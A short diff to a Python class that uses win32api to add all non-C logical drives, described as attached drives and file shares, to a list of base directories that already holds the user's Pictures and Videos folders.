@@ -7,6 +7,7 @@
 # Import libs
 import os
 import locale
+import win32api
 
 # Import classes
 
@@ -122,6 +123,14 @@ class Base():
                     os.path.join(home_dir, "Pictures"),
                     os.path.join(home_dir, "Videos")
                   ]
+
+
+      # Add attached drives and file shares, etc.
+      attached_drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
+      for drive in attached_drives:
+          if drive[0] != 'C':
+              base_dirs.append(drive)
+          
 
       return base_dirs
 
